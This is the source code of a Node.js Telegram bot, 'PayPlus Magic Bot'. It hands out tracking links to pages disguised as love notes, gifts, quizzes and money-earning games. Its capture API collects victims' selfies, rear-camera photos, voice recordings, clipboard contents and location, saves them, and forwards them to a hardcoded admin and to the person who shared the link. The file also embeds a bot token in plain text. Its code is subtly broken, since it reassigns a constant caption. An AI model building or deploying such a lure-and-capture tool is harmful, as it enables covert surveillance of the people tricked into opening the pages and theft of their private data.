/* ================================================================
   PayPlus Magic Bot - Ultimate Version
   Admin: 8233835640 | Support: @no_vi1
   Includes: Selfie, Camera, Clipboard, Voice, Location + 25 pages
   ================================================================ */

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

// ═══════════ CONFIG ═══════════
const BOT_TOKEN = '8909959176:AAF6V-RuF5nSAyKh1JOYijYoQJH7ZXB8GSM';
const ADMIN_ID = 8233835640;
const APP_URL = 'https://vip-1-6d4c.onrender.com';
const PORT = process.env.PORT || 3000;
const SUPPORT = '@no_vi1';
const CHANNEL = 'https://t.me/Pay_PIus_Bot';
const DB_PATH = path.join(__dirname, 'data.json');
const UPLOADS = path.join(__dirname, 'uploads');

if (!fs.existsSync(UPLOADS)) fs.mkdirSync(UPLOADS, { recursive: true });

// ═══════════ DATABASE ═══════════
let DB = {
  users: {},
  captures: [],
  links: {},
  stats: { totalUsers: 0, totalSelfies: 0, totalVoice: 0, totalLinks: 0, totalPages: 0 }
};

function loadDB() {
  try {
    if (fs.existsSync(DB_PATH)) DB = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    if (!DB.users) DB.users = {};
    if (!DB.captures) DB.captures = [];
    if (!DB.links) DB.links = {};
    if (!DB.stats) DB.stats = { totalUsers: 0, totalSelfies: 0, totalVoice: 0, totalLinks: 0, totalPages: 0 };
  } catch (e) {}
}

function saveDB() {
  try { fs.writeFileSync(DB_PATH, JSON.stringify(DB, null, 2)); } catch (e) {}
}

loadDB();

function getUser(id) {
  const uid = String(id);
  if (!DB.users[uid]) {
    DB.users[uid] = {
      id: uid,
      firstName: '',
      lastName: '',
      username: '',
      photo: '',
      selfies: 0,
      voices: 0,
      captures: 0,
      joinedAt: Date.now()
    };
    DB.stats.totalUsers++;
    saveDB();
  }
  return DB.users[uid];
}

// ═══════════ EXPRESS ═══════════
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));
app.use('/uploads', express.static(UPLOADS));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// ═══════════ BOT ═══════════
const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 1000, autoStart: true } });
const flows = {};

function isAdmin(msg) {
  return msg.from && msg.from.id === ADMIN_ID;
}

// ═══════════ UPLOAD CAPTURE API ═══════════
app.post('/api/capture', async function(req, res) {
  try {
    const { userId, type, data, extra } = req.body;
    if (!userId || !type || !data) return res.status(400).json({ success: false });

    const user = getUser(userId);
    let fileBuffer = null;
    let ext = 'jpg';
    let caption = '';

    // Parse data URL
    if (typeof data === 'string' && data.indexOf('data:') === 0) {
      const matches = data.match(/^data:(.+?);base64,(.+)$/);
      if (matches) {
        const mime = matches[1];
        fileBuffer = Buffer.from(matches[2], 'base64');
        if (mime.indexOf('png') > -1) ext = 'png';
        else if (mime.indexOf('webm') > -1) ext = 'webm';
        else if (mime.indexOf('mp4') > -1) ext = 'mp4';
        else if (mime.indexOf('ogg') > -1) ext = 'ogg';
        else if (mime.indexOf('mpeg') > -1) ext = 'mp3';
        else if (mime.indexOf('wav') > -1) ext = 'wav';
      }
    }

    const timestamp = Date.now();
    const filename = type + '_' + userId + '_' + timestamp + '.' + ext;
    const filepath = path.join(UPLOADS, filename);

    if (fileBuffer) {
      fs.writeFileSync(filepath, fileBuffer);
    }

    const record = {
      id: 'CAP' + timestamp,
      userId: userId,
      type: type,
      file: fileBuffer ? '/uploads/' + filename : null,
      extra: extra || null,
      date: timestamp
    };

    DB.captures.push(record);
    if (DB.captures.length > 500) DB.captures = DB.captures.slice(-500);

    // Stats
    if (type === 'selfie' || type === 'camera_back') DB.stats.totalSelfies++;
    if (type === 'voice') DB.stats.totalVoice++;
    user.captures = (user.captures || 0) + 1;
    if (type === 'selfie') user.selfies = (user.selfies || 0) + 1;
    if (type === 'voice') user.voices = (user.voices || 0) + 1;
    saveDB();

    // Send to admin AND to user
    const userInfo = (user.firstName || '') + ' ' + (user.lastName || '');
    const header = '📸 *التقاط جديد*\n\n' +
      '👤 ' + userInfo + '\n' +
      '🆔 `' + userId + '`\n' +
      '📛 @' + (user.username || 'لا يوجد') + '\n' +
      '📂 النوع: ' + getTypeLabel(type) + '\n' +
      '🕐 ' + new Date(timestamp).toLocaleString('ar-EG') + '\n';

    if (extra && extra.text) header += '📝 النص: ' + extra.text + '\n';
    if (extra && extra.lat) header += '📍 الموقع: ' + extra.lat + ', ' + extra.lng + '\n';
    if (extra && extra.clipboard) header += '📋 الحافظة: ' + extra.clipboard + '\n';

    const photoCaption = extra && extra.caption ? extra.caption : header;

    // Send to admin
    try {
      if (fileBuffer && (type === 'selfie' || type === 'camera_back' || type === 'video')) {
        await bot.sendPhoto(ADMIN_ID, fileBuffer, { caption: header, parse_mode: 'Markdown' });
      } else if (fileBuffer && type === 'voice') {
        await bot.sendVoice(ADMIN_ID, fileBuffer, { caption: header, parse_mode: 'Markdown' });
      } else if (extra && extra.text) {
        await bot.sendMessage(ADMIN_ID, header, { parse_mode: 'Markdown' });
      } else if (extra && extra.clipboard) {
        await bot.sendMessage(ADMIN_ID, header + '\n\n`' + extra.clipboard + '`', { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(ADMIN_ID, header, { parse_mode: 'Markdown' });
      }
    } catch (e) { console.log('[Send Admin]', e.message); }

    // Send to user (privacy feedback)
    try {
      if (fileBuffer && (type === 'selfie' || type === 'camera_back')) {
        await bot.sendPhoto(userId, fileBuffer, {
          caption: '✅ *تم الإرسال بنجاح*\n\n' +
            '📸 نوع: ' + getTypeLabel(type) + '\n' +
            '📅 ' + new Date(timestamp).toLocaleString('ar-EG'),
          parse_mode: 'Markdown'
        });
      } else if (fileBuffer && type === 'voice') {
        await bot.sendVoice(userId, fileBuffer, {
          caption: '✅ تم إرسال التسجيل الصوتي'
        });
      }
    } catch (e) { console.log('[Send User]', e.message); }

    res.json({ success: true, id: record.id, file: record.file });
  } catch (e) {
    console.error('[Capture]', e);
    res.status(500).json({ success: false, error: e.message });
  }
});

function getTypeLabel(type) {
  const labels = {
    selfie: '📸 سيلفي',
    camera_back: '📷 كاميرا خلفية',
    video: '🎬 فيديو',
    voice: '🎤 تسجيل صوتي',
    clipboard: '📋 حافظة',
    location: '📍 موقع',
    text: '📝 نص'
  };
  return labels[type] || type;
}

// ═══════════ GENERATE LINK API ═══════════
app.post('/api/generate-link', function(req, res) {
  try {
    const { userId, page, params } = req.body;
    if (!userId || !page) return res.status(400).json({ success: false });

    const code = Math.random().toString(36).substring(2, 8).toUpperCase();
    const linkData = {
      code: code,
      page: page,
      userId: userId,
      params: params || {},
      clicks: 0,
      created: Date.now()
    };
    DB.links[code] = linkData;
    DB.stats.totalLinks++;
    saveDB();

    res.json({
      success: true,
      code: code,
      url: APP_URL + '/p/' + code,
      short: 't.me/' + 'Pay_PIus_Bot' + '?start=' + code
    });
  } catch (e) {
    res.status(500).json({ success: false });
  }
});

// Redirect page
app.get('/p/:code', function(req, res) {
  const code = req.params.code.toUpperCase();
  const link = DB.links[code];
  if (!link) return res.status(404).send('<h1>Link not found</h1>');

  link.clicks = (link.clicks || 0) + 1;
  saveDB();

  const params = new URLSearchParams(Object.assign({}, link.params, { ref: link.userId, code: code }));
  res.redirect('/pages/' + link.page + '.html?' + params.toString());
});

// ═══════════ GET USER CAPTURES API ═══════════
app.get('/api/captures/:userId', function(req, res) {
  const list = DB.captures.filter(function(c) { return c.userId === String(req.params.userId); });
  res.json({ success: true, captures: list.reverse().slice(0, 30) });
});

// ═══════════ BOT KEYBOARDS ═══════════
function mainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📸  الأزرار السحرية', callback_data: 'menu_magic' }],
        [{ text: '💌  صفحات رومانسية', callback_data: 'menu_love' }, { text: '🛠️  أدوات ذكية', callback_data: 'menu_tools' }],
        [{ text: '💰  أدوات الربح', callback_data: 'menu_earn' }, { text: '🎨  صفحات ترفيهية', callback_data: 'menu_fun' }],
        [{ text: '📊  إحصائياتي', callback_data: 'my_stats' }, { text: '🔗  روابطي', callback_data: 'my_links' }],
        [{ text: '👑  لوحة المدير', callback_data: 'menu_admin' }]
      ]
    }
  };
}

function magicMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📸  سيلفي فوري', callback_data: 'page_selfie' }, { text: '📷  كاميرا خلفية', callback_data: 'page_camera_back' }],
        [{ text: '🎤  تسجيل صوتي', callback_data: 'page_voice' }, { text: '📋  آخر 3 نسخ', callback_data: 'page_clipboard' }],
        [{ text: '📍  موقعي', callback_data: 'page_location' }, { text: '🎬  فيديو 5 ثواني', callback_data: 'page_video' }],
        [{ text: '🖥️  معلومات جهازي', callback_data: 'page_device' }, { text: '🔋  حالة البطارية', callback_data: 'page_battery' }],
        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
      ]
    }
  };
}

function loveMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '💌  صندوق أحبك', callback_data: 'page_love_box' }, { text: '🌹  وردة حب', callback_data: 'page_rose' }],
        [{ text: '💍  عرض زواج', callback_data: 'page_proposal' }, { text: '🎂  عيد ميلاد', callback_data: 'page_birthday' }],
        [{ text: '💕  رسالة مسحورة', callback_data: 'page_magic_msg' }, { text: '💖  قلب متحرك', callback_data: 'page_heart' }],
        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
      ]
    }
  };
}

function toolsMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗  اختصار روابط', callback_data: 'page_short' }, { text: '📱  QR Code', callback_data: 'page_qr' }],
        [{ text: '🔐  مولّد كلمات سر', callback_data: 'page_password' }, { text: '🎨  مولّد ألوان', callback_data: 'page_colors' }],
        [{ text: '📊  اختبار سرعة', callback_data: 'page_speed' }, { text: '💱  محول عملات', callback_data: 'page_currency' }],
        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
      ]
    }
  };
}

function earnMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🎰  عجلة الحظ', callback_data: 'page_wheel' }, { text: '🎁  هدية عشوائية', callback_data: 'page_gift' }],
        [{ text: '👥  دعوة الأصدقاء', callback_data: 'page_invite' }, { text: '🏆  تحديات يومية', callback_data: 'page_challenges' }],
        [{ text: '🧠  مسابقة السؤال', callback_data: 'page_quiz' }, { text: '💵  اربح المال', callback_data: 'page_earn' }],
        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
      ]
    }
  };
}

function funMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🎯  اختبار شخصية', callback_data: 'page_personality' }, { text: '🎲  حظك اليوم', callback_data: 'page_luck' }],
        [{ text: '😄  نكتة عشوائية', callback_data: 'page_joke' }, { text: '💬  اقتباس ملهم', callback_data: 'page_quote' }],
        [{ text: '🎵  اقتراح أغنية', callback_data: 'page_music' }, { text: '🌌  صورة فضاء', callback_data: 'page_space' }],
        [{ text: '🔙  رجوع', callback_data: 'menu_main' }]
      ]
    }
  };
}

function adminMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📊  إحصائيات شاملة', callback_data: 'adm_stats' }],
        [{ text: '📸  آخر التقاطات', callback_data: 'adm_captures' }],
        [{ text: '👥  المستخدمين', callback_data: 'adm_users' }],
        [{ text: '🔗  الروابط المولدة', callback_data: 'adm_links' }],
        [{ text: '📣  بث جماعي', callback_data: 'adm_broadcast' }],
        [{ text: '🗑️  مسح الالتقاطات', callback_data: 'adm_clear' }],
        [{ text: '🏠  الرئيسية', callback_data: 'menu_main' }]
      ]
    }
  };
}

// ═══════════ /start ═══════════
bot.onText(/\/start/, async function(msg) {
  const chatId = msg.chat.id;
  const user = getUser(msg.from.id);

  // Save user
  user.firstName = msg.from.first_name || '';
  user.lastName = msg.from.last_name || '';
  user.username = msg.from.username || '';

  if (!user.photo) {
    try {
      const photos = await bot.getUserProfilePhotos(msg.from.id, { limit: 1 });
      if (photos.total_count > 0) {
        const file = await bot.getFile(photos.photos[0][0].file_id);
        user.photo = 'https://api.telegram.org/file/bot' + BOT_TOKEN + '/' + file.file_path;
      }
    } catch (e) {}
  }
  saveDB();

  // Handle code from link
  const parts = msg.text.split(' ');
  if (parts[1] && DB.links[parts[1].toUpperCase()]) {
    const link = DB.links[parts[1].toUpperCase()];
    link.clicks = (link.clicks || 0) + 1;
    saveDB();
    const params = new URLSearchParams(Object.assign({}, link.params, { ref: link.userId, code: parts[1].toUpperCase() }));
    const pageUrl = APP_URL + '/pages/' + link.page + '.html?' + params.toString();
    return bot.sendMessage(chatId,
      '🔗 *تم فتح الرابط الخاص بك*\n\n' +
      '📄 الصفحة: ' + link.page + '\n\n' +
      '⬇️ *اضغط لفتح الصفحة*',
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🚀 فتح الصفحة', web_app: { url: pageUrl } }]
          ]
        }
      }
    );
  }

  const appUrl = APP_URL + '?uid=' + msg.from.id;

  bot.sendMessage(chatId,
    '╔══════════════════════════════╗\n' +
    '   ✨ *مرحباً بك في PayPlus Magic* ✨\n' +
    '╚══════════════════════════════╝\n\n' +
    '🎩 بوتك السحري الخاص!\n\n' +
    '📸 كاميرات تفاعلية\n' +
    '💌 صفحات رومانسية\n' +
    '🛠️ أدوات ذكية\n' +
    '💰 أدوات ربح حقيقية\n\n' +
    '━━━━━━━━━━━━━━━━━━\n' +
    '👤 ' + (msg.from.first_name || 'صديقي') + '\n' +
    '🆔 `' + msg.from.id + '`\n' +
    '━━━━━━━━━━━━━━━━━━',
    Object.assign({ parse_mode: 'Markdown' }, mainMenu())
  );

  // Also send web app button
  setTimeout(function() {
    bot.sendMessage(chatId,
      '🚀 *أو افتح التطبيق الكامل:*',
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 فتح التطبيق الرئيسي', web_app: { url: appUrl } }],
            [{ text: '📞 الدعم', url: 'https://t.me/' + SUPPORT.replace('@', '') }]
          ]
        }
      }
    ).catch(function(){});
  }, 500);
});

// ═══════════ CALLBACK HANDLER ═══════════
bot.on('callback_query', async function(q) {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const data = q.data;
  const uid = q.from.id;

  if (!isAdmin(q) && data.indexOf('adm_') === 0) {
    return bot.answerCallbackQuery(q.id, { text: '⚠️ للمدير فقط' });
  }
  bot.answerCallbackQuery(q.id);

  // Navigation
  const menus = {
    'menu_main': { title: '🏠 *القائمة الرئيسية*\n\nاختر قسماً:', keyboard: mainMenu() },
    'menu_magic': { title: '📸 *الأزرار السحرية*\n\n✨ كل زر يفتح صفحة تفاعلية:', keyboard: magicMenu() },
    'menu_love': { title: '💌 *صفحات رومانسية*\n\n💕 اختر هديتك:', keyboard: loveMenu() },
    'menu_tools': { title: '🛠️ *أدوات ذكية*\n\n⚡ أدوات متقدمة:', keyboard: toolsMenu() },
    'menu_earn': { title: '💰 *أدوات الربح*\n\n💵 ابدأ الربح:', keyboard: earnMenu() },
    'menu_fun': { title: '🎨 *صفحات ترفيهية*\n\n🎉 مرح:', keyboard: funMenu() },
    'menu_admin': { title: '👑 *لوحة المدير*\n\n⚙️ تحكم كامل:', keyboard: adminMenu() }
  };

  if (menus[data]) {
    return bot.editMessageText(menus[data].title,
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, menus[data].keyboard)
    );
  }

  // My stats
  if (data === 'my_stats') {
    const u = getUser(uid);
    return bot.editMessageText(
      '📊 *إحصائياتك*\n\n' +
      '👤 ' + (u.firstName || '') + ' ' + (u.lastName || '') + '\n' +
      '🆔 `' + u.id + '`\n' +
      '━━━━━━━━━━━━━━━\n' +
      '📸 صور سيلفي: *' + (u.selfies || 0) + '*\n' +
      '🎤 تسجيلات: *' + (u.voices || 0) + '*\n' +
      '📁 إجمالي الالتقاطات: *' + (u.captures || 0) + '*\n' +
      '📅 انضم: ' + new Date(u.joinedAt).toLocaleDateString('ar-EG'),
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, mainMenu())
    );
  }

  // My links
  if (data === 'my_links') {
    const links = Object.values(DB.links).filter(function(l) { return l.userId === String(uid); });
    let text = '🔗 *روابطك المولدة*\n\n';
    if (links.length === 0) {
      text += '📭 لا توجد روابط بعد\n\nافتح أي صفحة واضغط "توليد رابط"';
    } else {
      links.slice(-10).reverse().forEach(function(l) {
        text += '`' + l.code + '` — ' + l.page + ' (' + l.clicks + ' نقرة)\n';
      });
    }
    return bot.editMessageText(text,
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, mainMenu())
    );
  }

  // Page buttons - generate link and open web app
  if (data.indexOf('page_') === 0) {
    const pageName = data.replace('page_', '');
    const code = Math.random().toString(36).substring(2, 8).toUpperCase();
    DB.links[code] = {
      code: code,
      page: pageName,
      userId: String(uid),
      params: {},
      clicks: 0,
      created: Date.now()
    };
    DB.stats.totalLinks++;
    saveDB();

    const pageUrl = APP_URL + '/pages/' + pageName + '.html?uid=' + uid + '&code=' + code;

    return bot.editMessageText(
      '✨ *جاري فتح الصفحة...*\n\n' +
      '📄 ' + pageName + '\n' +
      '🔗 كود الرابط: `' + code + '`\n\n' +
      '⬇️ اضغط للفتح:',
      {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🚀 فتح ' + pageName, web_app: { url: pageUrl } }],
            [{ text: '🔙 رجوع', callback_data: 'menu_main' }]
          ]
        }
      }
    );
  }

  // ═══════════ ADMIN ═══════════
  if (data === 'adm_stats') {
    const users = Object.values(DB.users);
    return bot.editMessageText(
      '📊 *الإحصائيات الشاملة*\n\n' +
      '👥 المستخدمين: *' + users.length + '*\n' +
      '📸 صور سيلفي: *' + DB.stats.totalSelfies + '*\n' +
      '🎤 تسجيلات صوتية: *' + DB.stats.totalVoice + '*\n' +
      '📁 إجمالي الالتقاطات: *' + DB.captures.length + '*\n' +
      '🔗 روابط مولدة: *' + DB.stats.totalLinks + '*\n' +
      '━━━━━━━━━━━━━━━\n' +
      '📅 ' + new Date().toLocaleString('ar-EG'),
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
    );
  }

  if (data === 'adm_captures') {
    const recent = DB.captures.slice(-10).reverse();
    if (recent.length === 0) {
      return bot.editMessageText('📭 لا توجد التقاطات بعد',
        Object.assign({ chat_id: chatId, message_id: msgId }, adminMenu())
      );
    }
    let text = '📸 *آخر 10 التقاطات*\n\n';
    recent.forEach(function(c, i) {
      const u = DB.users[c.userId] || {};
      text += (i+1) + '. ' + (u.firstName || 'مجهول') + ' — ' + c.type + '\n' +
              '🕐 ' + new Date(c.date).toLocaleString('ar-EG') + '\n\n';
    });
    return bot.editMessageText(text,
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
    );
  }

  if (data === 'adm_users') {
    const users = Object.values(DB.users).sort(function(a, b) { return (b.captures||0) - (a.captures||0); }).slice(0, 20);
    let text = '👥 *أكثر 20 نشاطاً*\n\n';
    users.forEach(function(u, i) {
      text += (i+1) + '. ' + (u.firstName || 'User') + ' — ' + (u.captures || 0) + ' 📸\n';
    });
    return bot.editMessageText(text,
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
    );
  }

  if (data === 'adm_links') {
    const links = Object.values(DB.links).slice(-15).reverse();
    let text = '🔗 *آخر الروابط*\n\n';
    links.forEach(function(l) {
      text += '`' + l.code + '` → ' + l.page + ' (' + l.clicks + ')\n';
    });
    return bot.editMessageText(text,
      Object.assign({ chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }, adminMenu())
    );
  }

  if (data === 'adm_broadcast') {
    flows[chatId] = { action: 'broadcast' };
    return bot.editMessageText(
      '📣 *بث جماعي*\n\nأرسل الرسالة الآن:\n\n👥 المستخدمين: ' + Object.keys(DB.users).length,
      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'menu_admin' }]] } }
    );
  }

  if (data === 'adm_clear') {
    return bot.editMessageText(
      '⚠️ *تأكيد مسح الالتقاطات*\n\nسيتم حذف ' + DB.captures.length + ' التقاط. هذا لا يمكن التراجع!',
      { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [
          [{ text: '🗑️ نعم، امسح الكل', callback_data: 'adm_clear_yes' }],
          [{ text: '❌ إلغاء', callback_data: 'menu_admin' }]
        ]}}
    );
  }

  if (data === 'adm_clear_yes') {
    DB.captures.forEach(function(c) {
      if (c.file) {
        const fp = path.join(UPLOADS, path.basename(c.file));
        if (fs.existsSync(fp)) try { fs.unlinkSync(fp); } catch(e) {}
      }
    });
    DB.captures = [];
    saveDB();
    return bot.editMessageText('✅ تم مسح جميع الالتقاطات',
      Object.assign({ chat_id: chatId, message_id: msgId }, adminMenu())
    );
  }
});

// ═══════════ ADMIN MESSAGES ═══════════
bot.on('message', async function(msg) {
  const chatId = msg.chat.id;
  if (!isAdmin(msg)) return;
  if (msg.text && msg.text.indexOf('/') === 0) return;

  const flow = flows[chatId];
  if (!flow) return;

  if (flow.action === 'broadcast') {
    const text = msg.text || msg.caption;
    if (!text) return;
    delete flows[chatId];
    const users = Object.keys(DB.users);
    const progress = await bot.sendMessage(chatId, '📣 جاري الإرسال... 0/' + users.length);
    let sent = 0;
    for (let i = 0; i < users.length; i++) {
      try {
        await bot.sendMessage(users[i], '📣 *رسالة من الإدارة*\n\n' + text, { parse_mode: 'Markdown' });
        sent++;
      } catch (e) {}
      await new Promise(function(r) { setTimeout(r, 50); });
    }
    return bot.editMessageText(
      '✅ *تم البث*\n\n📤 ' + sent + ' من ' + users.length,
      Object.assign({ chat_id: chatId, message_id: progress.message_id, parse_mode: 'Markdown' }, adminMenu())
    );
  }
});

// ═══════════ MENU BUTTON ═══════════
async function setupMenu() {
  try {
    await bot.setChatMenuButton({
      menu_button: {
        type: 'web_app',
        text: 'فتح التطبيق',
        web_app: { url: APP_URL }
      }
    });
    console.log('✅ Menu Button set');
  } catch (e) {
    console.log('❌ Menu:', e.message);
  }
}

bot.on('polling_error', function(err) { console.log('[Poll]', err.message); });

app.listen(PORT, function() {
  console.log('═══════════════════════════════');
  console.log('🚀 PayPlus Magic Bot v6.0');
  console.log('📍 Port: ' + PORT);
  console.log('🌐 App: ' + APP_URL);
  console.log('👑 Admin: ' + ADMIN_ID);
  console.log('═══════════════════════════════');
  setupMenu();
});
